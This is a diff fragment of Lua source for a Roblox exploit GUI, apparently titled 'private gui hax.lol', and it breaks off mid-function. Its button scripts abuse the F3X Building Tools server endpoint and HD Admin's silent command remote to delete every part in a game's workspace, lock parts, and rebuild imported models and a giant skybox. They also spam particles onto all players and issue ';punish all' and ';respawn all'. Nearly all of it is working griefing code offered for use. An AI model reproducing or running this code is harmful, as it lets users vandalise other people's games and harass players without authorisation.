+		local backpack = player.Backpack
+	
+		local function getf3x()
+			for _, v in ipairs(backpack:GetChildren()) do
+				if v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+			for _, v in ipairs(char:GetChildren()) do
+				if v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+	
+			return nil
+		end
+		local f3x = getf3x()
+		if not f3x then
+			warn("where yo btools at")
+		end
+		local syncapi = f3x.SyncAPI
+		local serverendpoint = syncapi.ServerEndpoint
+	
+		local function delete(part)
+			local args = {
+				[1] = "Remove",
+				[2] = {
+					[1] = part
+				}
+			}
+			serverendpoint:InvokeServer(unpack(args))
+		end
+	
+		local function deleteall()
+			for _, v in ipairs(workspace:GetChildren()) do
+				if v ~= "Sound" then
+					task.spawn(function()
+						delete(v)
+					end)
+				end
+			end
+		end
+	
+		deleteall()
+		wait(0.8)
+	
+		local function resize(part,size,cf)
+			local args = {
+				[1] = "SyncResize",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["CFrame"] = cf,
+						["Size"] = size
+					}
+				}
+			}
+			serverendpoint:InvokeServer(unpack(args))
+		end
+	
+		local function MovePart(part,cf)
+			local args = {
+				[1] = "SyncMove",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["CFrame"] = cf
+					}
+				}
+			}
+			serverendpoint:InvokeServer(unpack(args))
+		end
+	
+		local function syncmaterial(part,mate,trans)
+			local args = {
+				[1] = "SyncMaterial",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Material"] = mate
+					}
+				}
+			}
+			serverendpoint:InvokeServer(unpack(args))
+		end
+		local function transparency(part,trans)
+			local args = {
+				[1] = "SyncMaterial",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Transparency"] = trans
+					}
+				}
+			}
+			serverendpoint:InvokeServer(unpack(args))
+		end
+	
+		local function MakeMeshNeon(part)
+			local args = {
+				[1] = "SyncMesh",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["VertexColor"] = vector.create(3, 3, 3)
+					}
+				}
+			}
+			serverendpoint:InvokeServer(unpack(args))
+		end
+	
+		local function color(part, color)
+			local args = {
+				[1] = "SyncColor",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Color"] = color,
+						["UnionColoring"] = false
+					}
+				}
+			}
+			serverendpoint:InvokeServer(unpack(args))
+		end
+	
+		local function syncmeshid(part, id)
+			local args = {
+				[1] = "SyncMesh",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["MeshId"] = "rbxassetid://"..id
+					}
+				}
+			}
+			serverendpoint:InvokeServer(unpack(args))
+		end
+	
+		local function makemesh(part)
+			local args = {
+				[1] = "CreateMeshes",
+				[2] = {
+					[1] = {
+						["Part"] = part
+					}
+				}
+			}
+			serverendpoint:InvokeServer(unpack(args))
+		end
+	
+		local function syncmeshsize(part, vectora)
+			local args = {
+				[1] = "SyncMesh",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Scale"] = vectora
+					}
+				}
+			}
+			serverendpoint:InvokeServer(unpack(args))
+		end
+	
+		local function syncmeshtexture(part, id)
+			local args = {
+				[1] = "SyncMesh",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["TextureId"] =	"rbxassetid://"..id
+					}
+				}
+			}
+			serverendpoint:InvokeServer(unpack(args))
+		end
+	
+		local function name(part, stringa)
+			local args = {
+				[1] = "SetName",
+				[2] = {
+					[1] = part
+				},
+				[3] = stringa
+			}
+			serverendpoint:InvokeServer(unpack(args))
+		end
+	
+		local function lock(part, boolean)
+			local args = {
+				[1] = "SetLocked",
+				[2] = {
+					[1] = part
+				},
+				[3] = boolean
+			}
+			serverendpoint:InvokeServer(unpack(args))
+		end
+	
+		local function setcollision(part, booleana)
+			local args = {
+				[1] = "SyncCollision",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["CanCollide"] = booleana
+					}
+				}
+			}
+			serverendpoint:InvokeServer(unpack(args))
+		end
+	
+		local function setanchor(part, boolean)
+			local args = {
+				[1] = "SyncAnchor",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Anchored"] = boolean
+					}
+				}
+			}
+			serverendpoint:InvokeServer(unpack(args))
+		end
+	
+		local function createdecal(part, side)
+			local args = {
+				[1] = "CreateTextures",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Face"] = side,
+						["TextureType"] = "Decal"
+					}
+				}
+			}
+			serverendpoint:InvokeServer(unpack(args))
+		end
+		local function setdecal(part, asset, side)
+			local args = {
+				[1] = "SyncTexture",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Face"] = side,
+						["TextureType"] = "Decal",
+						["Texture"] = "rbxassetid://".. asset
+					}
+				}
+			}
+			serverendpoint:InvokeServer(unpack(args))
+		end
+	
+		local function lockall()
+			for _, v in ipairs(workspace:GetDescendants()) do
+				if v:IsA("BasePart") then
+					spawn(function()
+						lock(v, true)
+					end)
+				end
+			end
+		end
+	
+		local function sky()
+			local position = CFrame.new(0, 5, 0)
+			local sky = serverendpoint:InvokeServer("CreatePart", "Normal", position, workspace)
+	
+			makemesh(sky)
+			syncmeshid(sky, "111891702759441")
+			syncmeshtexture(sky, "80212785156303")
+			MakeMeshNeon(sky)
+			syncmeshsize(sky, Vector3.new(4000, 4000, 4000))
+			lock(sky, true)
+			name(sky, "the skybox lolz")
+			setcollision(sky, false)
+		end
+	
+		local function spawnrealm()
+			local model_id = "117897133619949"
+			local imported_model = game:GetObjects("rbxassetid://" .. model_id)[1]
+			imported_model.Parent = game.Lighting
+	
+	
+			for _, v in next, imported_model:GetDescendants() do
+				pcall(function()
+					v.Anchored = true
+				end)
+			end
+	
+			local plr = game:GetService("Players").LocalPlayer
+			local f3x_name = "Building Tools"
+			local destination = workspace
+	
+			coroutine.wrap(function()
+				task.wait(10)
+				imported_model.Parent = nil
+			end)()
+	
+			function f3xbuildpart(part, cframe, destination, size, transparency, colour, material, collision, fake_part)
+				local allPartsData = {}
+	
+	
+				table.insert(allPartsData, {
+					Type = fake_part:IsA("WedgePart") and "Wedge" or fake_part:IsA("Seat") and "Seat" or fake_part:IsA("VehicleSeat") and "VehicleSeat" or fake_part:IsA("TrussPart") and "Truss" or fake_part:IsA("SpawnLocation") and "Spawn" or
+						fake_part.Shape == Enum.PartType.Block and "Normal" or
+						fake_part.Shape == Enum.PartType.Ball and "Ball" or
+						fake_part.Shape == Enum.PartType.Cylinder and "Cylinder",
+					CFrame = fake_part.CFrame,
+					Size = fake_part.Size,
+					Transparency = fake_part.Transparency,
+					Color = fake_part.Color,
+					Material = fake_part.Material,
+					Collision = fake_part.CanCollide,
+					Ref = fake_part,
+				})
+	
+				local sync = plr.Backpack:FindFirstChild(f3x_name).SyncAPI.ServerEndpoint
+				local partMap = {}
+	
+	
+				for _, data in ipairs(allPartsData) do
+					local created = sync:InvokeServer("CreatePart", data.Type, data.CFrame, destination)
+					partMap[data.Ref] = created
+				end
+	
+				for _, data in ipairs(allPartsData) do
+					local created = partMap[data.Ref]
+					if not created then continue end
+	
+					if data.Size ~= Vector3.new(4,1,2) then
+						task.spawn(function()
+							sync:InvokeServer("SyncResize", {
+								{ Part = created, CFrame = created.CFrame, Size = data.Size }
+							})
+						end)
+					end
+	
+					if data.Transparency ~= 0 then
+						task.spawn(function()
+							sync:InvokeServer("SyncMaterial", {
+								{ Part = created, Transparency = data.Transparency }
+							})
+						end)
+					end
+	
+					if data.Color ~= BrickColor.new("Medium stone grey").Color then
+						task.spawn(function()
+							sync:InvokeServer("SyncColor", {
+								{ Part = created, Color = data.Color, UnionColoring = true }
+							})
+						end)
+					end
+	
+					if data.Material ~= "Plastic" then
+						task.spawn(function()
+							sync:InvokeServer("SyncMaterial", {
+								{ Part = created, Material = data.Material }
+							})
+						end)
+					end
+	
+					if data.Collision ~= true then
+						task.spawn(function()
+							sync:InvokeServer("SyncCollision", {
+								{ Part = created, CanCollide = data.Collision }
+							})
+						end)
+					end
+	
+					local ref = data.Ref
+	
+					local texture = ref:FindFirstChildOfClass("Texture")
+					if texture then
+						task.spawn(function()
+							sync:InvokeServer("CreateTextures", {
+								{ Part = created, Face = texture.Face, TextureType = "Texture" }
+							})
+						end)
+						task.spawn(function()
+							sync:InvokeServer("SyncTexture", {
+								{ Part = created, Face = texture.Face, TextureType = "Texture", StudsPerTileU = texture.StudsPerTileU, StudsPerTileV = texture.StudsPerTileV, Texture = texture.Texture, Transparency = texture.Transparency }
+							})
+						end)
+					end
+	
+					local decal = ref:FindFirstChildOfClass("Decal")
+					if decal then
+						task.spawn(function()
+							sync:InvokeServer("CreateTextures", {
+								{ Part = created, Face = decal.Face, TextureType = "Decal" }
+							})
+						end)
+						task.spawn(function()
+							sync:InvokeServer("SyncTexture", {
+								{ Part = created, Face = decal.Face, TextureType = "Decal", Texture = decal.Texture, Transparency = decal.Transparency }
+							})
+						end)
+					end
+	
+					local mesh = ref:FindFirstChildOfClass("SpecialMesh")
+					if mesh then
+						task.spawn(function()
+							sync:InvokeServer("CreateMeshes", {
+								{ Part = created }
+							})
+						end)
+						task.spawn(function()
+							sync:InvokeServer("SyncMesh", {
+								{ Part = created, MeshId = mesh.MeshId, TextureId = mesh.TextureId, Scale = mesh.Scale }
+							})
+						end)
+					end
+	
+					local light1 = ref:FindFirstChildOfClass("SpotLight")
+					if light1 then
+						task.spawn(function()
+							sync:InvokeServer("CreateLights", {
+								{ Part = created, LightType = "SpotLight" }
+							})
+						end)
+						task.spawn(function()
+							sync:InvokeServer("SyncLighting", {
+								{ Part = created, LightType = "SpotLight", Color = light1.Color, Range = light1.Range, Face = light1.Face, Angle = light1.Angle, Shadows = light1.Shadows }
+							})
+						end)
+					end
+	
+					local light2 = ref:FindFirstChildOfClass("PointLight")
+					if light2 then
+						task.spawn(function()
+							sync:InvokeServer("CreateLights", {
+								{ Part = created, LightType = "PointLight" }
+							})
+						end)
+						task.spawn(function()
+							sync:InvokeServer("SyncLighting", {
+								{ Part = created, LightType = "PointLight", Color = light2.Color, Range = light2.Range, Shadows = light2.Shadows }
+							})
+						end)
+	
+	
+					end
+				end
+			end
+	
+			for _, part in next, imported_model:GetDescendants() do
+				local spawnpart = task.spawn
+				if part:IsA("Part") then
+					if part.Shape == Enum.PartType.Block then
+						spawnpart(function()
+							f3xbuildpart("Normal", part.CFrame, destination, part.Size, part.Transparency, part.Color, part.Material, part.CanCollide, part)
+						end)
+					elseif part.Shape == Enum.PartType.Ball then
+						spawnpart(function()
+							f3xbuildpart("Ball", part.CFrame, destination, part.Size, part.Transparency, part.Color, part.Material, part.CanCollide, part)
+						end)
+					elseif part.Shape == Enum.PartType.Cylinder then
+						spawnpart(function()
+							f3xbuildpart("Cylinder", part.CFrame, destination, part.Size, part.Transparency, part.Color, part.Material, part.CanCollide, part)
+						end)
+					end
+				elseif part:IsA("WedgePart") then
+					spawnpart(function()
+						f3xbuildpart("Wedge", part.CFrame, destination, part.Size, part.Transparency, part.Color, part.Material, part.CanCollide, part)
+					end)
+				elseif part:IsA("Seat") then
+					spawnpart(function()
+						f3xbuildpart("Seat", part.CFrame, destination, part.Size, part.Transparency, part.Color, part.Material, part.CanCollide, part)
+					end)
+				elseif part:IsA("TrussPart") then
+					spawnpart(function()
+						f3xbuildpart("Truss", part.CFrame, destination, part.Size, part.Transparency, part.Color, part.Material, part.CanCollide, part)
+					end)
+				elseif part:IsA("VehicleSeat") then
+					spawnpart(function()
+						f3xbuildpart("VehicleSeat", part.CFrame, destination, part.Size, part.Transparency, part.Color, part.Material, part.CanCollide, part)
+					end)
+				elseif part:IsA("SpawnLocation") then
+					spawnpart(function()
+						f3xbuildpart("Spawn", part.CFrame, destination, part.Size, part.Transparency, part.Color, part.Material, part.CanCollide, part)
+					end)
+				end
+			end
+	
+		end
+	
+	
+	
+	
+	
+	
+	
+	
+	
+		spawnrealm()
+		sky()
+		lockall()
+	
+		wait(0.5)
+		RequestCommand:InvokeServer(";respawn all")
+		RequestCommand:InvokeServer(";music 91050821396198 ;pitch 0.19 ;volume 2")
+	end)
+end;
+task.spawn(C_2b0);
+-- StarterGui.private gui hax.lol.HD Abuse 2 tab Page.Set Particle Self.LocalScript
+function C_2b4()
+local script = G2L["2b4"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local Players = game:GetService("Players")
+		local player = Players.LocalPlayer
+		local char = player.Character or player.CharacterAdded:Wait()
+		local sizetxt = script.Parent.Parent.sizetextbox.Text
+		local x, y, z = sizetxt:match("([%d%.]+),([%d%.]+),([%d%.]+)")
+		local camera = workspace.CurrentCamera
+	
+		local backpack = player:WaitForChild("Backpack")
+		local texture = script.Parent.Parent.particletextbox.Text
+		local cooldownbro = script.Parent.Parent.cooldown.Text
+	
+		local function getf3x()
+			for _, v in ipairs(backpack:GetChildren()) do
+				if v:FindFirstChild("SyncAPI") then return v end
+			end
+			for _, v in ipairs(char:GetChildren()) do
+				if v:FindFirstChild("SyncAPI") then return v end
+			end
+			return nil
+		end
+	
+		local f3x = getf3x()
+		if not f3x then
+			print("where yo btool at my nga")
+			return
+		end
+	
+		local endpoint = f3x.SyncAPI.ServerEndpoint
+	
+		local function ohno(args)
+			task.defer(function()
+				pcall(function()
+					endpoint:InvokeServer(unpack(args))
+				end)
+			end)
+		end
+	
+		local sizehax = Vector3.new(tonumber(x), tonumber(y), tonumber(z))
+		local speedness = script.Parent.Parent.velocitytextbox.Text
+		local haxxyone = 2.5
+	
+		for _, part in pairs(char:GetDescendants()) do
+			if part:IsA("BasePart") then
+				ohno({"SyncCollision", {{Part = part, CanCollide = false}}})
+			end
+		end
+	
+		local poop = 0
+		local maxparticlehax = 30
+	
+		local function spawnParticle(torso)
+			if poop >= maxparticlehax then return end
+			poop = poop + 1
+	
+			local rootPart = char:FindFirstChild("HumanoidRootPart") or torso
+			local spawnCF = rootPart.CFrame + Vector3.new(0, -12, 0)
+			local part = endpoint:InvokeServer("CreatePart", "Normal", spawnCF, workspace)
+			if not part then 
+				poop = poop - 1
+				return 
+			end
+			
+			ohno({"SetName", {part}, "watchmerollinghax"})
+			ohno({"SyncResize", {{Part = part, CFrame = spawnCF, Size = sizehax}}})
+			ohno({"SyncAnchor", {{Part = part, Anchored = true}}})
+			ohno({"SyncCollision", {{Part = part, CanCollide = false}}})
+			ohno({"SyncMaterial", {{Part = part, Transparency = 0.02}}})
+			ohno({"CreateMeshes", {{Part = part}}})
+			ohno({"SyncMesh", {{Part = part, MeshId = "rbxassetid://111891702759441"}}})
+			ohno({"SyncMesh", {{Part = part, TextureId = "rbxassetid://" .. texture}}})
+			ohno({"SyncMesh", {{Part = part, Scale = sizehax}}})
+			ohno({"SyncMesh", {{Part = part, VertexColor = Vector3.new(2, 2, 2)}}})
+	
+			local attachCF = torso.CFrame + Vector3.new(0, 0, 0)
+			ohno({"SyncMove", {{Part = part, CFrame = attachCF}}})
+	
+			local randomDir = Vector3.new(math.random(-speedness, speedness), math.random(-speedness, speedness), math.random(-speedness, speedness))
+			local startPos = attachCF.Position
+	
+			task.defer(function()
+				local lifetime = 0
+				while lifetime < haxxyone do
+					if not part or not part.Parent then break end
+					local progress = lifetime / haxxyone
+					local newPos = startPos + (randomDir * progress)
+					local lookAt = CFrame.new(newPos, camera.CFrame.Position)
+					ohno({"SyncMove", {{Part = part, CFrame = lookAt}}})
+					task.wait(0.05)
+					lifetime = lifetime + 0.05
+				end
+				ohno({"Remove", {part}})
+				poop = poop - 1
+			end)
+		end
+	
+		local function olivertree()
+			while true do
+				task.wait(cooldownbro)
+				local torso = char:FindFirstChild("UpperTorso") or char:FindFirstChild("Torso")
+				if torso then
+					spawnParticle(torso)
+				end
+			end
+		end
+	
+		task.defer(olivertree)
+	end)
+end;
+task.spawn(C_2b4);
+-- StarterGui.private gui hax.lol.HD Abuse 2 tab Page.Set Particle All.LocalScript
+function C_2b7()
+local script = G2L["2b7"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local Players = game:GetService("Players")
+		local player = Players.LocalPlayer
+		local camera = workspace.CurrentCamera
+		local workspace = game:GetService("Workspace")
+		local sizetxt = script.Parent.Parent.sizetextbox.Text
+		local x, y, z = sizetxt:match("([%d%.]+),([%d%.]+),([%d%.]+)")
+	
+		local backpack = player:WaitForChild("Backpack")
+		local texture = script.Parent.Parent.particletextbox.Text
+		local cooldownbro = script.Parent.Parent.cooldown.Text
+	
+		local function getf3x()
+			for _, v in ipairs(backpack:GetChildren()) do
+				if v:FindFirstChild("SyncAPI") then return v end
+			end
+			for _, v in ipairs(player.Character:GetChildren()) do
+				if v:FindFirstChild("SyncAPI") then return v end
+			end
+			return nil
+		end
+	
+		local f3x = getf3x()
+		if not f3x then
+			print("where yo btool at my nga")
+			return
+		end
+	
+		local endpoint = f3x.SyncAPI.ServerEndpoint
+	
+		local function ohno(args)
+			task.defer(function()
+				pcall(function()
+					endpoint:InvokeServer(unpack(args))
+				end)
+			end)
+		end
+	
+		local sizehax = Vector3.new(tonumber(x), tonumber(y), tonumber(z))
+		local speedness = script.Parent.Parent.velocitytextbox.Text
+		local haxxyone = 2.5
+	
+		local allman = Players:GetPlayers()
+	
+		local function spawnParticle(targetChar)
+			local torso = targetChar:FindFirstChild("UpperTorso") or targetChar:FindFirstChild("Torso")
+			if not torso then return end
+	
+			local rootPart = targetChar:FindFirstChild("HumanoidRootPart") or torso
+			local spawnCF = rootPart.CFrame + Vector3.new(0, -12, 0)
+			local part = endpoint:InvokeServer("CreatePart", "Normal", spawnCF, workspace)
+			if not part then return end
+			
+			ohno({"SetName", {part}, "watchmerollinghax"})
+			ohno({"SyncResize", {{Part = part, CFrame = spawnCF, Size = sizehax}}})
+			ohno({"SyncAnchor", {{Part = part, Anchored = true}}})
+			ohno({"SyncCollision", {{Part = part, CanCollide = false}}})
+			ohno({"SyncMaterial", {{Part = part, Transparency = 0.02}}})
+			ohno({"CreateMeshes", {{Part = part}}})
+			ohno({"SyncMesh", {{Part = part, MeshId = "rbxassetid://111891702759441"}}})
+			ohno({"SyncMesh", {{Part = part, TextureId = "rbxassetid://" .. texture}}})
+			ohno({"SyncMesh", {{Part = part, Scale = sizehax}}})
+			ohno({"SyncMesh", {{Part = part, VertexColor = Vector3.new(2, 2, 2)}}})
+	
+			local attachCF = torso.CFrame + Vector3.new(0, 0, 0)
+			ohno({"SyncMove", {{Part = part, CFrame = attachCF}}})
+	
+			local randomDir = Vector3.new(math.random(-speedness, speedness), math.random(-speedness, speedness), math.random(-speedness, speedness))
+			local startPos = attachCF.Position
+	
+			task.defer(function()
+				local lifetime = 0
+				while lifetime < haxxyone do
+					if not part or not part.Parent then break end
+					local progress = lifetime / haxxyone
+					local newPos = startPos + (randomDir * progress)
+					local lookAt = CFrame.new(newPos, camera.CFrame.Position)
+					ohno({"SyncMove", {{Part = part, CFrame = lookAt}}})
+					task.wait(0.05)
+					lifetime = lifetime + 0.05
+				end
+				ohno({"Remove", {part}})
+			end)
+		end
+	
+		local function olivertree()
+			while true do
+				task.wait(cooldownbro)
+				for _, plr in ipairs(allman) do
+					local targetChar = plr.Character
+					if targetChar then
+						spawnParticle(targetChar)
+					end
+				end
+			end
+		end
+	
+		task.defer(olivertree)
+	end)
+end;
+task.spawn(C_2b7);
+-- StarterGui.private gui hax.lol.HD Abuse 2 tab Page.imagehax.LocalScript
+function C_2ba()
+local script = G2L["2ba"];
+	local textbox = script.Parent.Parent.particletextbox
+	local image = script.Parent
+	
+	textbox:GetPropertyChangedSignal("Text"):Connect(function()
+		image.Image = "rbxassetid://" .. textbox.Text
+	end)
+end;
+task.spawn(C_2ba);
+-- StarterGui.private gui hax.lol.HD Abuse 2 tab Page.Reset.LocalScript
+function C_2be()
+local script = G2L["2be"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local yes1 = script.Parent.Parent.sizetextbox
+		local yes2 = script.Parent.Parent.velocitytextbox
+		local yes3 = script.Parent.Parent.cooldown
+		
+		if yes1 then
+			yes1.Text = "3,3,0.01"
+		end
+		
+		if yes2 then
+			yes2.Text = "25"
+		end
+		
+		if yes3 then
+			yes3.Text = "0.05"
+		end
+	end)
+end;
+task.spawn(C_2be);
+-- StarterGui.private gui hax.lol.HD Abuse 2 tab Page.Convert.LocalScript
+function C_2c2()
+local script = G2L["2c2"];
+	script.Parent.MouseButton1Click:Connect(function()
+		-- fixed by 1sw0rd1
+		-- credit to 1sword1
+		-- (edited script anti crash by Elv4r0x)
+	
+		local Players = game:GetService("Players")
+		local player = Players.LocalPlayer
+		local character = player.Character 
+		local char = player.Character
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommand:InvokeServer(";punish all")
+	
+		local backpack = player.Backpack
+	
+		local function getf3x()
+			for _, v in ipairs(backpack:GetChildren()) do
+				if v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+			for _, v in ipairs(char:GetChildren()) do
+				if v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+			return nil
+		end
+	
+		local f3x = getf3x()
+		if not f3x then
+			warn("you dont have f3x skid")
+			return
+		end
+	
+		local syncapi = f3x.SyncAPI
+		local serverendpoint = syncapi.ServerEndpoint
+	
+		local function ohno(args)
+			task.defer(function()
+				pcall(function()
+					serverendpoint:InvokeServer(unpack(args))
+				end)
+			end)
+		end
+	
+		local function delete(part)
+			ohno({"Remove", {part}})
+		end
+	
+		local function deleteall()
+			for _, v in ipairs(workspace:GetDescendants()) do
+				if (v:IsA("BasePart") or v:IsA("UnionOperation")) and v.Name ~= "kys" then
+					task.defer(function()
+						pcall(function()
+							delete(v)
+						end)
+					end)
+				end
+			end
+		end
+	
+		deleteall()
+	
+		local player = game.Players.LocalPlayer
+		local char = player.Character
+		local tool
+		for i,v in player:GetDescendants() do
+			if v.Name == "SyncAPI" and v.Parent:FindFirstChild("Tools") and not v.Parent:FindFirstChild("Tools"):FindFirstChild("Marketplace") then
+				tool = v.Parent
+			end
+		end
+		if tool == nil then
+			for i,v in player:GetDescendants() do
+				if v.Name == "SyncAPI" then
+					tool = v.Parent
+				end
+			end
+		end
+		remote = tool.SyncAPI.ServerEndpoint
+	
+		local model_id = script.Parent.Parent.modeltextbox.Text
+		local imported_model = game:GetObjects("rbxassetid://" .. model_id)[1]
+		imported_model.Parent = game.Lighting
+	
+		local destination = workspace:FindFirstChildOfClass("Terrain")
+		if tool ~= nil and tool:FindFirstChild("Tools") and tool:FindFirstChild("Tools"):FindFirstChild("Marketplace") then
+			destination = workspace
+		end
+	
+		for _, v in next, imported_model:GetDescendants() do
+			pcall(function() v.Anchored = true end)
+		end
+	
+		local totalparts = {}
+		local total = 0
+		local completed = 0
+	
+		for i,v in pairs(imported_model:GetDescendants()) do
+			if v:IsA("Part") or v:IsA("WedgePart") or v:IsA("Seat") or v:IsA("VehicleSeat") or v:IsA("TrussPart") or v:IsA("SpawnLocation") or v:IsA("CornerWedgePart") then
+				total += 1
+				local Type = v:IsA("WedgePart") and "Wedge" or v:IsA("Seat") and "Seat" or v:IsA("VehicleSeat") and "Vehicle Seat" or v:IsA("TrussPart") and "Truss" or v:IsA("SpawnLocation") and "Spawn" or v:IsA("CornerWedgePart") and "Corner" or
+					v.Shape == Enum.PartType.Block and "Normal" or
+					v.Shape == Enum.PartType.Ball and "Ball" or
+					v.Shape == Enum.PartType.Cylinder and "Cylinder"
+				task.defer(function()
+					local part = remote:InvokeServer("CreatePart", Type, v.CFrame, destination)
+					table.insert(totalparts, {new = part, old = v})
+					completed += 1
+				end)
+			end
+		end
+	
+		while completed < total do
+			task.wait()
+		end
+	
+		local syncResize = {}
+		for i,data in pairs(totalparts) do
+			table.insert(syncResize, {Part = data.new, CFrame = data.old.CFrame, Size = data.old.Size})
+		end
+		remote:InvokeServer("SyncResize", syncResize)
+	
+		local syncCollision = {}
+		for i,data in pairs(totalparts) do
+			if data.old.CanCollide ~= true then
+				table.insert(syncCollision, {Part = data.new, CanCollide = data.old.CanCollide})
+			end
+		end
+		if #syncCollision > 0 then
+			remote:InvokeServer("SyncCollision", syncCollision)
+		end
+	
+		local syncColor = {}
+		for i,data in pairs(totalparts) do
+			table.insert(syncColor, {Part = data.new, Color = data.old.Color})
+		end
+		remote:InvokeServer("SyncColor", syncColor)
+	
+		local syncMaterial = {}
+		for i,data in pairs(totalparts) do
+			if data.old.Material ~= "Plastic" or data.old.Reflectance ~= 0 or data.old.Transparency ~= 0 then
+				table.insert(syncMaterial, {Part = data.new, Material = data.old.Material, Transparency = data.old.Transparency, Reflectance = data.old.Reflectance})
+			end
+		end
+		if #syncMaterial > 0 then
+			remote:InvokeServer("SyncMaterial", syncMaterial)
+		end
+	
+		local syncSurface = {}
+		for i,data in pairs(totalparts) do
+			table.insert(syncSurface, {Part = data.new, Surfaces = {Top = data.old.TopSurface, Front = data.old.FrontSurface, Bottom = data.old.BottomSurface, Right = data.old.RightSurface, Left = data.old.LeftSurface, Back = data.old.BackSurface}})
+		end
+		remote:InvokeServer("SyncSurface", syncSurface)
+	
+		local createMeshes = {}
+		local syncMesh = {}
+		for i,data in pairs(totalparts) do
+			local mesh = data.old:FindFirstChildOfClass("SpecialMesh")
+			if mesh then
+				table.insert(createMeshes, {Part = data.new})
+				table.insert(syncMesh, {Part = data.new, MeshId = mesh.MeshId, TextureId = mesh.TextureId, Scale = mesh.Scale, MeshType = mesh.MeshType, VertexColor = mesh.VertexColor})
+			end
+		end
+		if #createMeshes > 0 then
+			remote:InvokeServer("CreateMeshes", createMeshes)
+			remote:InvokeServer("SyncMesh", syncMesh)
+		end
+	
+		local createMeshesCyl = {}
+		for i,data in pairs(totalparts) do
+			local mesh = data.old:FindFirstChildOfClass("CylinderMesh")
+			if mesh then
+				table.insert(createMeshesCyl, {Part = data.new})
+			end
+		end
+		if #createMeshesCyl > 0 then
+			remote:InvokeServer("CreateMeshes", createMeshesCyl)
+		end
+	
+		local createLightsSpot = {}
+		local syncLightSpot = {}
+		for i,data in pairs(totalparts) do
+			local light = data.old:FindFirstChildOfClass("SpotLight")
+			if light then
+				table.insert(createLightsSpot, {Part = data.new, LightType = "SpotLight"})
+				table.insert(syncLightSpot, {Part = data.new, LightType = "SpotLight", Color = light.Color, Range = light.Range, Face = light.Face, Angle = light.Angle, Shadows = light.Shadows})
+			end
+		end
+		if #createLightsSpot > 0 then
+			remote:InvokeServer("CreateLights", createLightsSpot)
+			remote:InvokeServer("SyncLighting", syncLightSpot)
+		end
+	
+		local createLightsPoint = {}
+		local syncLightPoint = {}
+		for i,data in pairs(totalparts) do
+			local light = data.old:FindFirstChildOfClass("PointLight")
+			if light then
+				table.insert(createLightsPoint, {Part = data.new, LightType = "PointLight"})
+				table.insert(syncLightPoint, {Part = data.new, LightType = "PointLight", Color = light.Color, Range = light.Range, Shadows = light.Shadows})
+			end
+		end
+		if #createLightsPoint > 0 then
+			remote:InvokeServer("CreateLights", createLightsPoint)
+			remote:InvokeServer("SyncLighting", syncLightPoint)
+		end
+	
+		local createLightsSurface = {}
+		local syncLightSurface = {}
+		for i,data in pairs(totalparts) do
+			local light = data.old:FindFirstChildOfClass("SurfaceLight")
+			if light then
+				table.insert(createLightsSurface, {Part = data.new, LightType = "SurfaceLight"})
+				table.insert(syncLightSurface, {Part = data.new, LightType = "SurfaceLight", Color = light.Color, Range = light.Range, Face = light.Face, Angle = light.Angle, Shadows = light.Shadows})
+			end
+		end
+		if #createLightsSurface > 0 then
+			remote:InvokeServer("CreateLights", createLightsSurface)
+			remote:InvokeServer("SyncLighting", syncLightSurface)
+		end
+	
+		local createTextures = {}
+		local syncTexture = {}
+		local createDecals = {}
+		local syncDecal = {}
+		local createFire = {}
+		local syncFire = {}
+		local createSparkles = {}
+		local syncSparkles = {}
+		local createSmoke = {}
+		local syncSmoke = {}
+	
+		for i,data in pairs(totalparts) do
+			local old = data.old
+			local new = data.new
+			for _, child in ipairs(old:GetChildren()) do
+				if child:IsA("Texture") then
+					table.insert(createTextures, {Part = new, Face = child.Face, TextureType = "Texture"})
+					table.insert(syncTexture, {Part = new, Face = child.Face, TextureType = "Texture", StudsPerTileU = child.StudsPerTileU, StudsPerTileV = child.StudsPerTileV, Texture = child.Texture, Transparency = child.Transparency})
+				elseif child:IsA("Decal") then
+					table.insert(createDecals, {Part = new, Face = child.Face, TextureType = "Decal"})
+					table.insert(syncDecal, {Part = new, Face = child.Face, TextureType = "Decal", Texture = child.Texture, Transparency = child.Transparency})
+				elseif child:IsA("Fire") and child.Enabled then
+					table.insert(createFire, {Part = new, DecorationType = "Fire"})
+					table.insert(syncFire, {Part = new, DecorationType = "Fire", Color = child.Color, SecondaryColor = child.SecondaryColor, Size = child.Size, Heat = child.Heat})
+				elseif child:IsA("Sparkles") and child.Enabled then
+					table.insert(createSparkles, {Part = new, DecorationType = "Sparkles"})
+					table.insert(syncSparkles, {Part = new, DecorationType = "Sparkles", SparkleColor = child.SparkleColor})
+				elseif child:IsA("Smoke") and child.Enabled then
+					table.insert(createSmoke, {Part = new, DecorationType = "Smoke"})
+					table.insert(syncSmoke, {Part = new, DecorationType = "Smoke", Color = child.Color, Size = child.Size, RiseVelocity = child.RiseVelocity, Opacity = child.Opacity})
+				end
+			end
+		end
+	
+		if #createTextures > 0 then
+			remote:InvokeServer("CreateTextures", createTextures)
+			remote:InvokeServer("SyncTexture", syncTexture)
+		end
+		if #createDecals > 0 then
+			remote:InvokeServer("CreateTextures", createDecals)
+			remote:InvokeServer("SyncTexture", syncDecal)
+		end
+		if #createFire > 0 then
+			remote:InvokeServer("CreateDecorations", createFire)
+			remote:InvokeServer("SyncDecorate", syncFire)
+		end
+		if #createSparkles > 0 then
+			remote:InvokeServer("CreateDecorations", createSparkles)
